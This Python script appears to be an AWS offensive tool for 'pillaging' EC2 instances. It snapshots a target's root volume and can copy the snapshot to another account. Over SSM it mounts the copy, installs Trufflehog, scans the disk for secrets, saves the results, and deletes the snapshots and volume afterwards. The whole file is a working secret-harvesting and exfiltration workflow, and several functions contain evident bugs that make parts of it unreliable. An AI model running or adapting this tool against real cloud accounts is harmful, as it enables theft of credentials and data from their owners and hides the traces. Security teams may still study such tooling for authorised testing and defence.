import boto3
import os
import subprocess
import logging
import argparse
import string
import time
from botocore.exceptions import ClientError  
import json
import re

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def list_ebs_volumes(ec2_resource):
    """List all available EBS volumes."""
    try:
        volumes = [volume for volume in ec2_resource.volumes.all() if volume.state == 'available']
        return volumes
    except Exception as e:
        logging.error(f"Failed to list EBS volumes: {str(e)}")
        return []

def list_ec2_instances(src_profile, src_region):
    """List all EC2 instances."""
    try:
        session = boto3.Session(profile_name=src_profile, region_name=src_region)
        ec2_resource = session.resource('ec2')
        instances = list(ec2_resource.instances.all())
        return instances
    except Exception as e:
        logging.error(f"Failed to list EC2 instances: {str(e)}")
        return []

def create_snapshot(ec2_client, instance_id):
    """Create a snapshot of the root volume of the specified EC2 instance."""
    logging.info("Creating snapshot...")
    try:
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        availability_zone = instances[0]['Placement']['AvailabilityZone']

        root_device = instances[0].get('RootDeviceName')
        if not root_device:
            raise ValueError(f"No root device found for instance {instance_id}")
        
        volumes = instances[0].get('BlockDeviceMappings', [])
        src_volume_id = next((v['Ebs']['VolumeId'] for v in volumes if v['DeviceName'] == root_device), None)
        if not src_volume_id:
            raise ValueError(f"No volume ID found for instance {instance_id}")

        snapshot = ec2_client.create_snapshot(VolumeId=src_volume_id, Description='Snapshot for pillaging')
        ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
        
        logging.info(f"Snapshot {snapshot['SnapshotId']} created successfully.")
        return snapshot['SnapshotId']

    except Exception as e:
        logging.error(f"Failed to create snapshot: {str(e)}")
        return None

def transfer_snapshot(src_profile, dst_profile, snapshot_id):
    # Create AWS session for source and destination profiles
    src_session = boto3.Session(profile_name=src_profile)
    dst_session = boto3.Session(profile_name=dst_profile)
    
    # Get the account IDs associated with the profiles
    src_account_id = src_session.client('sts').get_caller_identity()['Account']
    dst_account_id = dst_session.client('sts').get_caller_identity()['Account']
    
    # Check if the source and destination accounts are the same
    if src_account_id == dst_account_id:
        print("Source and destination accounts are the same. Skipping snapshot transfer.")
        return
    
    # Transfer snapshot from source to destination
    ec2_src = src_session.resource('ec2')
    snapshot = ec2_src.Snapshot(snapshot_id)
    
    ec2_dst = dst_session.resource('ec2')
    snapshot.copy(
        SourceRegion=snapshot.meta.data['Region'],
        SourceSnapshotId=snapshot_id,
        DestinationRegion=snapshot.meta.data['Region'],
        DestinationAccountId=dst_account_id
    )
    print(f"Snapshot {snapshot_id} transferred from {src_profile} to {dst_profile}.")

def find_available_device(ec2_client, instance_id):
    """Find an available device name on the EC2 instance."""
    try:
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        root_device = instance['Reservations'][0]['Instances'][0]['RootDeviceName']
        attached_devices = [v['DeviceName'] for v in instance['Reservations'][0]['Instances'][0]['BlockDeviceMappings']]
        
        # Exclude root device from available devices and establish dictionary of devices aws cli sees (diff from what ec2 sees)
        available_devices = ['/dev/sdf', '/dev/sdg', '/dev/sdh', '/dev/sdi', '/dev/sdj', '/dev/sdk', '/dev/sdl', '/dev/sdm', '/dev/sdn', '/dev/sdo', '/dev/sdp', '/dev/sdq', '/dev/sdr', '/dev/sds', '/dev/sdt', '/dev/sdu', '/dev/sdv', '/dev/sdw', '/dev/sdx', '/dev/sdy', '/dev/sdz']
        available_devices = [dev for dev in available_devices if dev not in attached_devices and dev != root_device]

        # Choose the first available device name
        if available_devices:
            return available_devices[0]
        else:
            return None
    except Exception as e:
        logging.error(f"Failed to find available device: {str(e)}")
        return None

def create_volume(ec2_client, snapshot_id, instance_id):
    """Create a new EBS volume from the specified snapshot in the availability zone of the EC2 instance."""
    logging.info("Creating volume from snapshot...")
    try:
        # Fetch the availability zone of the EC2 instance
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        availability_zone = instances[0]['Placement']['AvailabilityZone']

        # Create the volume using the correct availability zone
        volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone)
        dst_volume_id = volume['VolumeId']  # Updated to capture the correct volume ID

        # Wait for the volume to become available
        attempts = 0
        while True:
            volume_status = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])['Volumes'][0]['State']
            if volume_status == 'available':
                logging.info(f"Volume {dst_volume_id} is now available.")
                break
            elif attempts >= 30:
                raise TimeoutError("Max attempts exceeded while waiting for volume to be available.")
            else:
                attempts += 1
                time.sleep(10)  # Wait for 10 seconds before checking again

        logging.info(f"Volume {dst_volume_id} created successfully from snapshot {snapshot_id}.")
        return dst_volume_id

    except Exception as e:
        logging.error(f"Failed to create volume from snapshot: {str(e)}")
        return None

def delete_snapshot_and_volume(ec2_client, src_snapshot_id, dst_snapshot_id, dst_volume_id, retain=False):
    """Delete the specified snapshots and EBS volume."""
    time.sleep(10)  # Delay before deletion

    try:
        # Check volume state and attachments for the destination volume
        volume_info = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])
        attachments = volume_info['Volumes'][0]['Attachments']
        
        if attachments:
            # Volume is attached, force detach it
            ec2_client.detach_volume(VolumeId=dst_volume_id, Force=True)
            logging.info(f"Volume {dst_volume_id} forcefully detached.")

        # Delete the destination volume
        ec2_client.delete_volume(VolumeId=dst_volume_id)
        logging.info(f"Deleted volume {dst_volume_id} in --dst-profile account.")

        if not retain:
            # Delete the source and destination snapshots
            ec2_client.delete_snapshot(SnapshotId=src_snapshot_id)
            logging.info(f"Deleted snapshot {src_snapshot_id} in --src-profile account.")
            
            ec2_client.delete_snapshot(SnapshotId=dst_snapshot_id)
            logging.info(f"Deleted snapshot {dst_snapshot_id} in --dst-profile account.")
        else:
            logging.info(f"Retaining snapshots {src_snapshot_id} and {dst_snapshot_id}.")
    except Exception as e:
        logging.error(f"Failed to delete volume or snapshots: {str(e)}")



def find_attached_volumes(instance_id, ssm_client):
    """Find attached NVMe volumes for the specified EC2 instance using SSM."""
    # Run lsblk command on the instance using SSM
    response = ssm_client.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Parameters={'commands': ['lsblk --json']}
    )

    # Get the command execution ID to retrieve the output
    command_id = response['Command']['CommandId']

    # Wait for the command to complete and get the output
    output = ''
    while True:
        time.sleep(5)  # Adjust the sleep duration as needed
        command_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )
        if command_output['Status'] in ['Success', 'Failed']:
            output = command_output['StandardOutputContent']
            break

    # Parse the JSON output of lsblk to get the attached NVMe volumes
    attached_nvme_volumes = []
    if output:
        lsblk_output = json.loads(output)
        for disk in lsblk_output['blockdevices']:
            if disk['name'].startswith('nvme') and disk.get('children'):
                for partition in disk['children']:
                    if partition['name'].startswith('nvme'):
                        attached_nvme_volumes.append(partition['name'])

    return attached_nvme_volumes
    
def mount_ebs_volume(instance_id, volume_id, ssh_key_path, mount_path, profile_name, region):
    """Mount the Linux partition of an EBS volume to a specified instance with SSM."""
    try:

        # Create an AWS session using the specified profile and region
        session = boto3.Session(profile_name=profile_name, region_name=region)

        # Create the SSM client using the session
        ssm_client = session.client('ssm')

        # Create the mount path using SSM
        create_mount_path_command = f"sudo mkdir -p {mount_path}"
        # print(f"Creating mount path command: {create_mount_path_command}")
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [create_mount_path_command]}
        )

        # Wait for the command to complete
        command_id = response['Command']['CommandId']
        # print(f"Waiting for command with ID {command_id} to complete...")

        # Add debug print statements here
        # print(f"Command ID: {command_id}")
        # print(f"Instance ID: {instance_id}")
        # print(f"Plugin Name: 'aws:runShellScript'")

        # print(f"Command with ID {command_id} completed.")

        # Find attached volumes using SSM
        # print(f"we are hereeeeeeee")
        attached_volumes = find_attached_volumes(instance_id, ssm_client)

        # Filter attached volumes to get only NVMe devices
        nvme_volumes = [volume for volume in attached_volumes if volume.startswith('nvme')]
        # print(f"NVMe volumes found: {nvme_volumes}")

        # Sort the NVMe volumes based on the numeric part of the device name
        nvme_volumes_sorted = sorted(nvme_volumes, key=lambda x: int(re.search(r'\d+', x).group()))
        # print(f"Sorted NVMe volumes: {nvme_volumes_sorted}")

        # Choose the first partition of the last attached NVMe volume for mounting
        if nvme_volumes_sorted:
            latest_device_name = nvme_volumes_sorted[-1]

            # Extract the drive number from the device name
            drive_number = re.search(r'nvme(\d+)', latest_device_name).group(1)

            # Recreate the device name with the first partition
            recreated_device_name = f"nvme{drive_number}n1p1"

            # print(f"Latest NVMe device name: {latest_device_name}")
            # print(f"Recreated device name for mounting: {recreated_device_name}")
        else:
            logging.error("No attached NVMe volumes found.")
            return None

        # Run the mount command using SSM for the first partition
        mount_command = f"sudo mount /dev/{recreated_device_name} {mount_path}"
        # print(f"Mounting command: {mount_command}")
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [mount_command]}
        )

        # Wait for the command to complete
        command_id = response['Command']['CommandId']
        # print(f"Waiting for mount command with ID {command_id} to complete...")

        logging.info(f"Volume {volume_id} mounted to {mount_path} on /dev/{recreated_device_name}")
        return mount_path

    except Exception as e:
        logging.error(f"Failed to attach and mount volume {volume_id} to {instance_id}: {str(e)}")
        return None

def install_trufflehog_ssm(instance_id, ssm_client):
    try:
        # SSM command to install Trufflehog
        install_command = "sudo apt update && sudo apt install -y wget && wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && tar xzf /tmp/trufflehog.tar.gz -C /tmp/"

        # Send the install command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [install_command]}
        )

        # Get the command execution ID to track installation progress if needed
        command_id = response['Command']['CommandId']
        # logging.info(f"Trufflehog installation command ID: {command_id}")

        # Stream the command output if necessary
        # stream_command_output(ssm_client, command_id, instance_id)
        # You may want to stream the output to monitor the installation progress

        return command_id

    except Exception as e:
        logging.error(f"Trufflehog installation over SSM failed: {str(e)}")
        return None

def run_trufflehog_ssm(instance_id, mount_point, pillage_path, ssh_key_path, ssm_client, json_output=False):
    try:
        # Install Trufflehog first
        install_command_id = install_trufflehog_ssm(instance_id, ssm_client)
        if not install_command_id:
            logging.error("Failed to initiate Trufflehog installation.")
            return None

        # SSM command to run Trufflehog and redirect output to a file
        output_file = '/tmp/trufflehog.out'
        ssm_command = f"/tmp/trufflehog filesystem {'--json' if json_output else ''} --no-verification --concurrency=5 {os.path.join(mount_point, pillage_path.lstrip('/'))} > {output_file}"

        # Send the run command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [ssm_command]}
        )

        # Get the command execution ID to retrieve the output
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the Trufflehog output directly from the EC2 instance
        status = stream_command_output(ssm_client, command_id, instance_id)

        if status == 'Success':
            # Read the Trufflehog output directly from the EC2 instance
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'StandardOutputContent' in command_output:
                trufflehog_output = command_output['StandardOutputContent']
                print(trufflehog_output)  # Print the Trufflehog output to stdout

            logging.info("Trufflehog run completed over SSM.")
        elif status == 'Failed':
            logging.error("Trufflehog command execution failed.")
        else:
            logging.error(f"Trufflehog command status: {status}")

        return status  # Return the final status of Trufflehog command execution

    except Exception as e:
        logging.error(f"Trufflehog scanning over SSM failed: {str(e)}")
        return None

def stream_command_output(ssm_client, command_id, instance_id):
    try:
        time.sleep(10)  # Introduce a delay before starting to retrieve output
        while True:
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'Status' in command_output:
                status = command_output['Status']
                if status in ['Success', 'Failed', 'Cancelled']:
                    break

            if 'StandardErrorContent' in command_output:
                logging.error(f"SSM stderr: {command_output['StandardErrorContent']}")

            time.sleep(5)

        # After the command completes, retrieve the final output
        final_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if 'StandardOutputContent' in final_output:
            # Save final stdout to a file
            with open('/tmp/trufflehog.out', 'w') as file:
                file.write(final_output['StandardOutputContent'])
            # Check if trufflehog.out is not empty and print its content
            file_path = '/tmp/trufflehog.out'
            if os.path.getsize(file_path) > 0:
                with open(file_path, 'r') as file:
                    content = file.read()
                    if content.strip():  # Check if content is not just whitespace
                        print(f"Final SSM stdout length: {len(content)}")
                        print(f"Final SSM stdout: {content}")
                    else:
                        logging.error("trufflehog.out content is empty or contains only whitespace.")
            else:
                logging.error("trufflehog.out is empty.")

        if 'StandardErrorContent' in final_output:
            logging.error(f"Final SSM stderr: {final_output['StandardErrorContent']}")

        return status

    except Exception as e:
        logging.error(f"Error streaming command output: {str(e)}")
        return None
    
def save_trufflehog_output(instance_id, ssm_client, out_file):
    """Save Trufflehog output to a local file."""
    try:
        # Retrieve Trufflehog output file from the instance
        get_command = f"sudo cat /tmp/trufflehog.out"
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [get_command]}
        )

        # Get the command execution ID to track file retrieval
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the output file
        while True:
            time.sleep(5)  # Adjust the sleep duration as needed
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )
            if command_output['Status'] in ['Success', 'Failed']:
                break

        # Save the output to the specified local file
        with open(out_file, 'w') as file:
            file.write(command_output['StandardOutputContent'])

        logging.info(f"Trufflehog output saved to {out_file}")

    except Exception as e:
        logging.error(f"Failed to save Trufflehog output to file: {str(e)}")

def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, mount_host, pillage, target_ec2, pillage_path, mount_path, ssh_key_path, retain=False, json_output=False, out_file=None, transfer=False):
    """Main function to handle AWS resources."""
    session = boto3.Session(profile_name=src_profile, region_name=src_region)
    ec2_client = session.client('ec2')
    ssm_client = session.client('ssm')

    if list_ebs:
        volumes = list_ebs_volumes(ec2_client)
        for volume in volumes:
            logging.info(f'EBS Volume ID: {volume.volume_id}')
        return  # Exit after listing EBS volumes

    if list_ec2:
        instances = list_ec2_instances(src_profile, src_region)
        for instance in instances:
            logging.info(f'Instance ID: {instance.id}, State: {instance.state["Name"]}')
        return  # Exit after listing EC2 instances

    if pillage and mount_host and target_ec2:
        snapshot_id = create_snapshot(ec2_client, target_ec2)
        if snapshot_id:
            if src_profile != dst_profile and transfer:
                snapshot_id = transfer_snapshot(src_profile, dst_profile, snapshot_id)

            if snapshot_id:
                dst_volume_id = create_volume(ec2_client, snapshot_id, target_ec2)
                if dst_volume_id:
                    logging.info(f'Volume {dst_volume_id} created and attached to instance {target_ec2}.')

                    mount_point = mount_ebs_volume(target_ec2, dst_volume_id, ssh_key_path, mount_path, src_profile, src_region)
                    if mount_point:
                        logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')

                        status = run_trufflehog_ssm(target_ec2, mount_point, pillage_path, ssh_key_path, ssm_client, json_output=json_output)
                        if status == 'Success':
                            if out_file:
                                save_trufflehog_output(target_ec2, ssm_client, out_file)
                            if not retain:
                                delete_snapshot_and_volume(ec2_client, snapshot_id, snapshot_id, dst_volume_id)  # Pass snapshot_id and dst_volume_id correctly
                            else:
                                logging.info("Volume and snapshot retained.")
                        else:
                            logging.error("Trufflehog execution failed.")
                    else:
                        print("Failed to mount volume.")
                else:
                    print("Failed to create volume.")
            else:
                print("Snapshot transfer failed.")
        else:
            print("Failed to create snapshot.")
    else:
        print("Not all necessary parameters provided for pillaging.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Process EBS volumes and enumerate EC2 instances.')
    parser.add_argument('--list-ebs', action='store_true', help='List available EBS volumes.')
    parser.add_argument('--list-ec2', action='store_true', help='List EC2 instances.')

    parser.add_argument('--mount-host', help='EC2 instance ID to mount volumes on when pillaging.')
    parser.add_argument('--target-ec2', help='Target EC2 instance ID for snapshot and mounting.')
    parser.add_argument('--pillage', action='store_true', help='Enable mounting and processing of volumes on the specified instance.')
    parser.add_argument('--pillage-path', help='Path within the mounted volume to run Trufflehog.', default='')
    parser.add_argument('--mount-path', help='Path to mount the EBS volume.')
    parser.add_argument('--ssh-key-path', help='Path to the SSH key file for SSH commands.')
    parser.add_argument('--retain', action='store_true', help='Retain the volume and snapshot after processing.')
    parser.add_argument('--json', action='store_true', help='Enable JSON output format for Trufflehog.')
    parser.add_argument('--out-file', help='Path to save the Trufflehog output locally.')

    parser.add_argument("--transfer", action="store_true", help="Transfer snapshot between AWS accounts")
    parser.add_argument("--src-profile", help="Source AWS profile (required for transfer)")
    parser.add_argument("--dst-profile", help="Destination AWS profile (required for transfer)")
    parser.add_argument("--src-region", help="Source AWS region (required for transfer)")
    parser.add_argument("--dst-region", help="Destination AWS region (required for transfer)")

    args = parser.parse_args()

    main(args.src_profile, args.dst_profile, args.src_region, args.dst_region, args.list_ebs, args.list_ec2, args.mount_host, args.pillage, args.target_ec2, args.pillage_path, args.mount_path, args.ssh_key_path, args.retain, args.json, args.out_file, args.transfer)